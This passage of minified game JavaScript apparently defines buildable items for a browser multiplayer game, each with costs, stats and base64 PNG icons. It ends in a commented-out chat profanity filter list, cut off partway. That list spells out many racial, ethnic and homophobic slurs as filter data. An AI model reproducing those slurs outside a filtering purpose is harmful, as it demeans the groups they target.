1TA9u3bkZ+fj6Qkhg5gfn4ew8PD6OnpQUKC+ra8Xm9fW9ufHwG+vwFM6pld9AKRCGTlALMVdnvl1xaL9aAagIWFBezevRvZ2dkCQKjBBEQgY2NjePbsGRITyXX58gM5B6R0AuOjegAJFwSfTwNMFput9IuysrLP1TY+MzODbdu2CQWYzWbNX1x5lkAmJycxNDSEgYGBJdWEvrurq+uHnp7e7wDfYLjpNhwQzAa5wFylJEk3tRx206ZN2LJlCzIzM8UvrCX70OcVdXi9XnR1dYFq0lAHs8t5IPkx4H0NYHY9wWO9INKA1Pckqb5J60spfwLgXzWJ09DZ2VlMTU0JOMwaKSkpqqDm5uZAIH19fRgfZ2mhvmS5+UNg5ncAvrXCWA+IBCAzT5KOM3ovW9z0rl27kJOTg+Tk5CDDaDx/WQJgHOjt7cXZs2fFO65cuYLS0lKhnNTU1GXw+CzfPTo6KhRCaGpLllsLgQnWHWuqStcJIsMiSbUsg4NWbm4uiouLRRwIVIECgDUDMwMD4smTJ1UNaWxshNVqRUFBwRKQQHciSKqDseP1a3pC8JLlm8XApCdqIMrLy5GVlbUEQDGem+aGVzJeS8YrQSEQuklnZ2fQ41EHYbfbkZ6eLjal+PTIyAgqKipErAhnuVwuoSQWYFSbUnswvvB/gStmQFAJBFBTUxOO7ZrPdnR0CCB0l5gHweh+7NixiIBobW0VNUnMg6D1PDccPKhaXIYNp729fel8EtOKoKVMcfv27QvbaLUXPHz4EMxOXDEPYmJiQpTT4QbJUBD9/f0i/rDWiAsQrBeY52tra3VVxY0bNwTctLS0+ADB9Pn06VOcPn1aVxBXr17Fnj17RMUaF4pg8dTd3Y36+npdQVy/fh07d+6MjzqClrPqc7vdOHLkiK4g7ty5I0p4pXyP+WDJoopl9f79+3UF8eDBA5ExlLNHzIOg9TwH8OCkZ+ZwOp0iY8QVCP5aDJrV1dW6qIIQGCSV80xcBEtukgGTpfaJEyd0AcHSeuvWrUFtu7hwDaUDxSZsuGn01q1bIkiGdrDiAgRlQBgsrlgR1tXVrUsZLS0tonOl1vWOSRC8p+DxWG3DTKcsu1lbNDQ0rApIU1MTduzYsdT0DXxIaezyQujFixdB74t6P4K70WrVKerw+Xyio3TmzJkVYVy+fFlUkGzohna9Y6xVl5kvSceH1KxhY7asrEyzeUs5M4ieOnVKFca1a9dEUMzIyFjW+FWat8+fP18qs0NfIsutBcAE7w4j3rzld5v87fxftH5a9i9LSkqC+piKMmiQx+PB0aNHgx6/ffu26DWEBkV+nq7FWMPut9aS5eYGfzufsxVrWuvpYitfoFzwVDkcjp/MZrNqY1K54FF6jYrU6efsW1AdPLKzPti8efOy5i8BrHTBw83IslwLJD+JxgWPAkO58iuy2Uq/1LryY03B9FdYWBgkefo7/8fFIKucIQiJ3W/2Hl6+fCna+mrLf+X3PeBj+z6sCZtwFBG4N+USuNzhOHTJbDaXqG1cr0tgj8fd7nI9+QpI+SdWLoFD7eX1dQaHxByOQ41aQPiL22w2cRYJHAugApgOte5H3W73vcePn1zwjwXoOnSmlyJCgXBQpACYf1uS6n/TilprHBT5AEh6BEwxW8X8oEigzYScDqS/WV1debGoyKLanGBtQQUo7bdQaB6P567L5foUmP7Xf7kbkVnMSCki0B5lmMzucDh+1MouaqqRZbnOf90f18NkobZxRigLSDuwivHCev944USkp+kC09+aCo8wP6ykWw6c1khSXWPg+2S55RyADsDnXs+MQzh72wjXUNufMnS29/Bhx89jY2PdTqfr20hkg9XCiRYIZX8EwmqJ5wKO/EQkEK4GRrRBrGaPG/IZA4QfswHCABHscYYiDEUYilDNQoZrGK5huIaqa/wH4HLecO4SZnEAAAAASUVORK5CYII=",
    scale: 65,
    indx: .5,
    holdOffset: 20,
    placeOffset: 0
}, {
    age: 5,
    group: j[11],
    type: 0,
    uF: [],
    name: "sapling",
    desc: "allows you to farm wood",
    req: ["wood", 150],
    url:"data:image/png;base64,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",
    iconLineMult: 12,
    colDiv: .5,
    scale: 110,
    indx: .5,
    holdOffset: 50,
    placeOffset: -15
}, {

    age: 4,
    group: j[5],
    name: "pit trap",
    uF: [],
    desc: "pit that traps enemies if they walk over it",
    req: ["wood", 30, "stone", 30],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAA4hJREFUeF7tms1r1EAYxp8EldL6WT+qV70UFapUQUR7zqaHNgVBD4KgN08q/hfqyaMeBEHxkvWwk9pjFRF00YKKF8+yftSvttRmSWR3szUbJp+T2Wztu7dlZybz/vK8z8y+Mwro0ySgEIcWAQLhKYFAEIhOUyBFkCJIEdyFklKjV1JjfHxqv207O2ZmytUi9zSFKkLXjT8ANnkAaoyZe4uCUQgIXTfcqIAZM7s+r64/MA5CG1C3YXQNRBiA/r6WOJaW+VPpFhDpIHTduA3gMi8VtFMrUNXWL44DTD9r20VgjVdwr1IxL8j0D2kgdN0oA5jgTV4fW4mMic3ygbiu+8SyypoMIFJA6PrUAuAOZIGw6hEhMAB8Z8wczBtGriCijDBOBWGBhamj0d51l/ssy2oswcKfXEDIABCMLApIHoYqBELTjDOqike81zF6sI6hXY7wm/IPUPuqovp+A/+/guKer1TK97M+MBMITZu4oqrqLd5DTx6xsX1r5H6po9vch1ZgI8P1xDH8+KXg+ZuN3Pau61y3rMc3Eg/mNcwEIiwV0vpAUO6i/VeNNsPONBcQeQXQDkR0vCyeIQwizaQXlhTMvuJLOijlsWM2NvcnTzG/unoWxJd5FS/f8k0uLpePH65j92C86fY8iKhlLw6C//c45fUsiLwABGGFASEQHikCQSA6k4YUQYogRXBXXUoNSg1KDUqNBgHaWXo6IBAEotMS1pwiVstm4ecTaf6Fh3oD7zk9W5ipfVNRfZetMDN6qI6hnf9BYcb/2n8vKnhaTVaqOz1qY8vAGirVRS1pYdqPK9rEVaOC4wbHKyQ10pTT4gIQBVBEOf8qgJu8N35ixMbgtuSSznLAM/9TwYu50BS7xpjJPXyKcudM5fz2gJpmnFVVPOA94OhwHfv2xJtcmqXj02cVr72TsWA/x8G56WnzYZrx/G2FQLQHWveHwEH6MoDIPgVvx5CLIjhAFgH082Sa1BAjACwxZnIvoWRNi0Y/KSCaS6puMAClLDAiIFiMmbpIwGF9pYH45x+TdwDlIm8CSS+TAe5dxsqXZACQmhpcFYRcMl031wvTGKq/bZbdoYhipKdGGnWI7AxFIEg1yyQTK5WMFUVBc4vourAty+RfsEwymGCbQhThn3OpNHmg8d2yyh8FYxHqXjgIodnn2JlAeDAJBIHozCtSBCmCFMFdayg1KDU6hfEXXvzCUuiEamMAAAAASUVORK5CYII=",
    trap: !0,
    ignoreCollision: !0,
    hideFromEnemy: !0,
    health: 500,
    colDiv: .2,
    scale: 50,
    indx: 0,
    holdOffset: 20,
    placeOffset: -5
}, {
    age: 4,
    group: j[6],
    name: "boost pad",
    uF: [],
    desc: "provides boost when stepped on",
    req: ["stone", 20, "wood", 5],
    url:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAAZ5JREFUeF7tmktOAkEQhhvQI3AGiSzcsTLxDCYeqA9k4hlIWLFzIeIZOIL4CNhDMmMDXVPz6NKPJel59DffX12TnoHjtycwgMMPAUAEEwABiHJRwAiMwIjoQkk0iAbR0EfDez+01Il67z9T71dUI3Yglsvnj9ST9zluNrsZAcI5B4igYacgribTPu3/de239cvhP0BghHMYESwABCDK9RIjMAIjov0L0fgL0RiPv9xmI3r3O9rNmjbi4f59P7HHp0t1u24WRAGhIKCFYRLELhJ3t9uSBfPFhSomJkFUbWjCCnMgYjb8SxDHbNDCMGXEKRsKEKvXoVutR+JVxAyIFAgaK8yAOBeJqgLS5RQQllpsqQ11IpK9EZLaUI2HpHBmD6KuDVIrsgahhSCBkS0ITSTqRCRbENeTZveLzzVZ2YIQt4bKAwBhqY9QPuykwzECI9jXYF/jVLGgRlAjMqkRSWtaT4M6/YaqpzkmXRYQAVPrIJIeRyaDWvvyNpP5tXIbzezHt3Jr3Z4UEIE3IABRjh5GYARGRJcjokE0iEY0Gt/OdwVhhTbZ6QAAAABJRU5ErkJggg==",
    ignoreCollision: !0,
    boostSpeed: 1.5,
    health: 150,
    colDiv: .7,
    scale: 45,
    indx: 0,
    holdOffset: 20,
    placeOffset: -5
}, {
    age: 7,
    group: j[7],
    doUpdate: !0,
    uF: [],
    name: "turret",
    desc: "defensive structure that shoots at enemies",
    req: ["wood", 200, "stone", 150],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAABBlJREFUeF7tmj1vE0EQhufsJBUyiBRUCRUSEhYUFKBIoKTMJUUs8X+S/BokBHKK+FImQiiCggIUlIIKuaIIAosqxD40ttfeG8/e3u7NWRHsSZYL3349+847++EIwjMkEAUOIwIBxFgJAUQAkTWFoIigiKAINlFWFhqbmzvtKKq/lE7PSfLmlXSdlabPEYhoR7LTaZoeHB0dtCTrVHVVrIgAAoIixlqjINbW1rwUfXp6Oin3T4TGfwsijlvnAHBfTacEiCiCd51O+5mXtCyFKjHLOG6ltF0JEKrOJGmL91u8Qg4CDkASRBTBSafT3pBUhhiION7ZA4h2TZ2TBDFtI91PkoM9CSAiIDgIS4sAl3+mXZQAQesc1S4DQwhE1hPu3e1D73cE3y9qExISIO4sD6BxI4Wv3+oZEUh4RmkQW1ut4zSFdb1n8fNL+PhlgQXR7XYBP6an0WjA6uoq4Dc++joCQTx+cAXJ26WZ4mVhlAJBjRGVgB98KAiJOFYgsC5UhaQyvEFsb79YHwz6x2qAt2+m8PTR1BSqBoHtvv+0CD9+6UPw9wtvEFQNGA76YwOxsrIC+NGfXq8HZ2dnRvHoipisKUiY+IaIFwiqhicPr2D51iAzgNnZGv1c1DR1b1AVcyBoiNRq9Y3Dw9cnrqHoBcKmBuwENTROAbbOojpQJdSIaTnalo8qnEFQNWCnaFjQjmEGaDabtnGzv3NZxtaejyqcQdB0yYUFBVE0HEykaJhQELMZxN00nUHYwuLiZw0+fF6YjKksBFWRDkNP01KmKQ6CmmQVIIqEo6tPlAJB1w7UJNEX1ArRyyC0QtQraHjQCZgrCJtEpdTAhYfNJwKIMbUAIoDIbsLmqgibWfqsJk2mSvch18osi6QxKcPU1xG2CRhmL8cD3lLpkwNBV3lVgCiymp0DiOwhrS2Fuuw4fZfYdDXrc8rtrAifTVcZryiyA6V7m7lsuobhQC5wqHFx23CfHWiRnSfXlmtYYB3OisBCVBVceHAddAkT7mCG8wYaFj5q8AZRVBXcAavyAW4fknfCXRS2jxpKgsiaJpfSsAE6Yz6bLy70sB660fJVQykQnCpMs2YKkyJQTBCuzXG+GgR36WvqvFIIDiJ7DJ9FkgeUg+qTLukkeJklrSTvoqfIrLu8I60E1bYQiNmbcJNnuAyavstfEbifT3J9EAEx8gv+bwFcynOFYc4+MhBKmyU3IO5SWL3nAiUv9Q59wnFTZYMvpgi9IdO/ZvR3MHTo7Rim2jwTVeWlIVSiCNVZbk9imxX773KhUEnWyBuABJAyCyU73NEblYQG1zgCSdP+Lv1Tibmj6X6ttnDic6FbdPD6e3MD4dO5eZYJIMa0A4gAIht4QRFBEUERbDIKoRFCI4RGCI28lWrwiDGdv3AZkWGMex2dAAAAAElFTkSuQmCC",
    health: 800,
    stop: true,
    projectile: 1,
    shootRange: 700,
    shootRate: 2200,
    scale: 43,
    index: 2,
    holdOffset: 20,
    placeOffset: -5
}, {
    age: 7,
    group: j[8],
    name: "platform",
    uF: [],
    desc: "platform to shoot over walls and cross over water",
    req: ["wood", 20],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAAVtJREFUeF7tmkEOwVAURV9jQJiIHZiYGhoa64gFSOzAWsQGxAbMiKHYhYlVSEyU/PqhX59qI5o2jmH9tq/Hve/d1PeET0jAg8OdACCsEgABCLcpoAgUgSLUQYk1sAbWwBpJKTpzj/D90bUMsXy9XmV6tkyLDQBAWBkAQgEx6NdUl2z3ZwmC51fv1m12Z+f8NOtaTU963ap63+j1crWGKbzTrsSKmi9PDojppKEWPlucnONp1hkQ42E9dr3D8SKAEBFAWG0AAhBum0ARKAJFMD6NBsgR1gmAAIRINIqjCBSBIh5BAWtYFIAAhBufUQSKQBEf320SqAhUBCoC1WujYHwyPhmfjE9DgP8+rQ4AAQi2BYQaYH+Ekg9K3yy1efd3W4fUoV+Qg7nuoSrIM6tlAMJi+TmIIqvgm9oy77z95mZFPhcQ9tcBBCBco6IIFIEi1OGFNbAG1sAaScn2BpFWBnB82lh8AAAAAElFTkSuQmCC",
    ignoreCollision: !0,
    zIndex: 1,
    health: 300,
    scale: 43,
    indx: 0,
    holdOffset: 20,
    placeOffset: -5
}, {
    age: 7,
    group: j[9],
    name: "healing pad",
    uF: [],
    desc: "standing on it will slowly heal you",
    req: ["wood", 30, "food", 10],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAAVJJREFUeF7tmkEKwjAQRVM9gOAlFFy460k8UA7kSbrrQtBLCB5AEXUQgqGdjjZp8LmUpkle3p8ETeX4PAlUcHgRAISYAAhAhEUBIzACI6IbJdEgGkTj+2h472clnUS99zfteAfViAeIpmmv2pfnfK6ut3NAOOcAIRomBbFab3La/9H36Xh4fwcIjHAOI8QCQJQKYnc5dxbZ/WJpKsLFGQEIWWdAACKMPEZgBEZEt0Gi8U/R6Ftt00kp0ih26JrUgQoQSu0x4lcE5D1EAxChUhiBEYUZoamJfVssP8x0aK8BPKkDlWbAGKE8dBENotG/I2giR43gf43QE4wo1QhN3i3PFGeEZZKaNoAgGoUXS43mlmeyRcMy2FRtkt6hSjUpSz+AEGqjg7CsTq42o928zTWhFP0OuoudYkC5+gCEkAcEIMIQYgRGYER0YyIaRINoRKNxB85lEmEa+oa0AAAAAElFTkSuQmCC",
    ignoreCollision: !0,
    healCol: 15,
    health: 400,
    colDiv: .7,
    scale: 45,
    indx: 0,
    holdOffset: 20,
    placeOffset: -5
}, {
    age: 9,
    group: j[10],
    name: "spawn pad",
    uF: [],
    desc: "you will spawn here when you die but it will dissapear",
    req: ["wood", 100, "stone", 100],
    health: 400,
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAAiNJREFUeF7tmrtOwzAUhk9hQAqCpYEFtYKplRjYupR3YOZFmDPzIsy8A126MSC1E6gVC6QLiEgMIBRwqtQ9ceziJLb0d0wcX7585/jStAi/XwItcPgjABDCBIAAiNWkACNgBIxgJ0qEBkIDofH/0IiiaMunlWgURd+6/TXKESmI8fj+S7fyJssNBmfbAEFEACE0rBVEr3/apP1rbU8nD8trAAEjiGCEsAAgfAMRxy+0iF+1Emyne0xBsKtVNivkhRHz2SMlSWI0sCAIqNM90X7GeRD5DmqPKldQd5p2FkQRgP3ekPb6Q5ZJfHdDn4s5e68MiDcgVADkkXNAvATB2XB0cWUUGc+312vlVTCcM4JLjKYQMgIyDFUCdQpEknzQfPa0fJM77Q6F55dGJsiF3ycjepuOlpfb4QGF4aHbew05JDY1QR6lbAYXIk4Zke+MDRsyILIVXoGwZQOXLwBCUAEIgCDKJ0wYASM8NsJkb1G24pL3Hl6FRjo4W1Oodwsq+RTKhhWyDUWnV06tLFMLsOnKBTq24QoYJnsPeW+RVuvlwUza8aKjOhUQDkDG1lsQ3DF72TTJ3S8DwLXj7H+fOM7PvWL59EplR9EplOoZ56bPTfS38QxACIoAARCrAQUjmjbCRoKrqo5a1xFVDcJGvQAhKFYOwsbbqquOyr68rWsATbRj9C12Ex2sq02AEKQBAiBWgw5GwAgYwU5ECA2EBkKDDY0fJZh+YTa6MyMAAAAASUVORK5CYII=",
    ignoreCollision: !0,
    spawnPoint: !0,
    scale: 45,
    indx: 0,
    holdOffset: 20,
    placeOffset: -5
}, {
    age: 7,
    group: j[12],
    name: "blocker",
    uF: [],
    desc: "blocks building in radius",
    req: ["wood", 30, "stone", 25],
    ignoreCollision: !0,
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAA05JREFUeF7tms9L3EAUxyeuXWqsFdrVg6BUKFjopWdPevCyelDw/1H/H8EedC89uKeevQgtCBYFD+1WUGsqq2tk4k47yc7vecmu5i2IsHnZ5H3y/b6ZN5mA4CchECCHRwIIoqsEBIEg0kUBFYGKQEUIB0q0BloDrYHWUM2iC60RKyvrC3Hc2YhjsqC8qYA0g6Cytbu73SyqBSgERL2+uklIsOGSVBCQ5t7ezqLLuTbn5AbCJ3l5AvFWo/F50yZB09hcQNTra7HuBt7WJkgYjiZ/UXSdhNP/v1u/dKeSRmMH/L7Bf1AFYe7DR22SfMD3b4fSeGgYYCBkVrBNXpa5GAqcVUBA5A2BwckTBhCIdE0Iw5BMz8xa2cA0+PTkmERRlAqHsIk3iGxNgLKCDkxWHb4wvEBkIaiUMN65I7PtNjkYCXU5Jsc//Y3IcbVKLirDwnhoZTiDENUFmRoohKU/l0lCR9WXWhgUwvv2TRL/5dVrKYzemuFePD1ApOuCDML89RWZurvtearb42+ET3r94rzn+7PhF+Tr6JgwHsoiICBsIciUwSshm7UpDNda4QRieXltn2+cRCB4O8iKAm8TFQR2vswmaVW42cMJhG6kMIHAkqMw6IfVBF0lFcGAsIc1CNpK39939tkNi9Rg8nR1CZuoSDYdHxqqLNq28NYgTGzBhj/Tp2wKRTXi8Kpwad2tQehswSclGgFMkxbFyUYaGutrDy8QtJWu1SaVuUHYxGTu0Wr9TLXwtqOHF4jpmXfJeoLu4wPDBAK9Pl3LOD358e9WBhKEa80whcCy5+1RKAibBstFFTYgnoQiXCDw8wyTRq2vILBYctVRZY9nPXzihKqrApxic3bQzS5L0XRRHtnVqUFqw136DJqT9cySCYNXRWkXZh5VgUt1iShw8VZRNEu5nC+qFfQ7m/5D17WqjvuuP2R/27lY8j9k86LHJ3l6LvSLHXY/QCDEO2Kg1THwL4FlxRPSKnlC8JpHyCRe+o0iqpohgsa2DtFjbPvQs9o69H80cd9JJy+obm+xTAo0SLHUXSjbuuvi08fzS56/TiEg2AVLv+HUTgH9iS5UEf1J0eyqCKLLCUEgiLRlUBGoCFSEcBhBa6A10BpoDdUc8wG9ozFhleVISQAAAABJRU5ErkJggg==",
    blocker: 300,
    health: 400,
    colDiv: .7,
    indx: 0,
    scale: 45,
    holdOffset: 20,
    placeOffset: -5
}, {
    age: 7,
    group: j[13],
    name: "teleporter",
    uF: [],
    desc: "teleports you to a random point on the map",
    req: ["wood", 60, "stone", 60],
    url: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAAAXNSR0IArs4c6QAAAzVJREFUeF7tmkFP2zAUxx16YMom7bBsN9B2otO+Age4Fg5F2vcBvs8keoBe6YGvMFFOTHDbssOkLdoOJZPbesRuHPs9v7gTeZUQqmon9i///3vPjhPBnzmBhDksCDCIpRIYBIPQgwIrghXBiqhNlGwNtgZbg63RVEVHjRGHhx/3ynJ2XJZir3FQiZgkSe/0/PzTJNYSIAqIwWB4IkRyjJlUkojJxcXZPqYvpE9rIEImb59AeToej04gE/Rt2wqIweCodA3gVfZapOnz+V9R/Jo3l/+/599cXcV4fEY+bvILNkHY6X9wTrLa4Gb62dqeGgYZCJsVoJO3zbweCp1VSEC0DUHBaRMGEQg9JqRpKra234Fs4Nv4/u5WFEWhNaewSTAIMyZQWcEFxlRHKIwgECaENpVggqFWBhpEXVyIpQZ7zMAHzwAQelyAQtj9uSuyWaY96JvNqbh+NnW5Qu9jpFisRUhAQCDUATBnDgVSjRdRQRwcHF1WF06+IIY/hqCnPXo58mqvB06cPVCKwGQKKARFwAcGRQYBg5BL6YeH2aUaqI8asBCwMDY2evvQJTwYBNQW73/3xc6fvpfEbY3yXi6uXlw1XqOqCszSHQwCaotQNfiqItQeQSDkUjrL3lifFIUa1MVdqsjzr9oSHpo9gkBsbb+d7yfYPlRq8FGF3Mu4v/vybyidBSEJhNQTQYpwZQxWxFKgnQHhCpY+5bRvXnWV3WsNlnISsezhqjCjp09oQUWhCpcazEAZpaDiErtiZmh1KbtiA6fLEqYa5HdoDSH7gNOn7GTuTrnihGIIheEDgcIWaBALGI87VL4gZD+fsttVTq9s5FR2qTBqIAPhkz3MwdcBgQKgskUgiNU33BBl+NYPTe1WX/jgdqeCQJj2kN87uZ2vnhQmg7ShBmxsUGNBZQ1zIjFf9FC/2CEGUX8ihjpm/PcvgetqC0WaCkabEIKDZZ3XO39QpAoFcnRokW0Wx4ee1NGhx2yCP0lnzyr4OsGVqUiyhusm5tLd1V7/vb3JV+8TBYS6YecPnMIUsJ7WURWxnin63ZVBLDkxCAahW4YVwYpgRdSmEbYGW4OtwdZoqjH/Av5ExVLxSFbJAAAAAElFTkSuQmCC",
    ignoreCollision: !0,
    teleport: !0,
    health: 200,
    colDiv: .7,
    indx: 0,
    scale: 45,
    holdOffset: 20,
    placeOffset: -5
}];
for (let e = 0; e < dt.length; ++e)
    dt[e].id = e,
        dt[e].pre && (dt[e].pre = e - dt[e].pre);
const R = {
    groups: j,
    projectiles: vc,
    weapons: xc,
    list: dt
}
, bc = []//["ahole", "anus", "ash0le", "ash0les", "asholes", "ass", "Ass Monkey", "Assface", "assh0le", "assh0lez", "asshole", "assholes", "assholz", "asswipe", "azzhole", "bassterds", "bastard", "bastards", "bastardz", "basterds", "basterdz", "Biatch", "bitch", "bitches", "Blow Job", "boffing", "butthole", "buttwipe", "c0ck", "c0cks", "c0k", "Carpet Muncher", "cawk", "cawks", "Clit", "cnts", "cntz", "cock", "cockhead", "cock-head", "cocks", "CockSucker", "cock-sucker", "crap", "cum", "cunt", "cunts", "cuntz", "dick", "dild0", "dild0s", "dildo", "dildos", "dilld0", "dilld0s", "dominatricks", "dominatrics", "dominatrix", "dyke", "enema", "f u c k", "f u c k e r", "fag", "fag1t", "faget", "fagg1t", "faggit", "faggot", "fagg0t", "fagit", "fags", "fagz", "faig", "faigs", "fart", "flipping the bird", "fuck", "fucker", "fuckin", "fucking", "fucks", "Fudge Packer", "fuk", "Fukah", "Fuken", "fuker", "Fukin", "Fukk", "Fukkah", "Fukken", "Fukker", "Fukkin", "g00k", "God-damned", "h00r", "h0ar", "h0re", "hells", "hoar", "hoor", "hoore", "jackoff", "jap", "japs", "jerk-off", "jisim", "jiss", "jizm", "jizz", "knob", "knobs", "knobz", "kunt", "kunts", "kuntz", "Lezzian", "Lipshits", "Lipshitz", "masochist", "masokist", "massterbait", "masstrbait", "masstrbate", "masterbaiter", "masterbate", "masterbates", "Motha Fucker", "Motha Fuker", "Motha Fukkah", "Motha Fukker", "Mother Fucker", "Mother Fukah", "Mother Fuker", "Mother Fukkah", "Mother Fukker", "mother-fucker", "Mutha Fucker", "Mutha Fukah", "Mutha Fuker", "Mutha Fukkah", "Mutha Fukker", "n1gr", "nastt", "nigger;", "nigur;", "niiger;", "niigr;", "orafis", "orgasim;", "orgasm", "orgasum", "oriface", "orifice", "orifiss", "packi", "packie", "packy", "paki", "pakie", "paky", "pecker", "peeenus", "peeenusss", "peenus", "peinus", "pen1s", "penas", "penis", "penis-breath", "penus", "penuus", "Phuc", "Phuck", "Phuk", "Phuker", "Phukker", "polac", "polack", "polak", "Poonani", "pr1c", "pr1ck", "pr1k", "pusse", "pussee", "pussy", "puuke", "puuker", "qweir", "recktum", "rectum", "retard", "sadist", "scank", "schlong", "screwing", "semen", "sex", "sexy", "Sh!t", "sh1t", "sh1ter", "sh1ts", "sh1tter", "sh1tz", "shit", "shits", "shitter", "Shitty", "Shity", "shitz", "Shyt", "Shyte", "Shytty", "Shyty", "skanck", "skank", "skankee", "skankey", "skanks", "Skanky", "slag", "slut", "sluts", "Slutty", "slutz", "son-of-a-bitch", "tit", "turd", "va1jina", "vag1na", "vagiina", "vagina", "vaj1na", "vajina", "vullva", "vulva", "w0p", "wh00r", "wh0re", "whore", "xrated", "xxx", "b!+ch", 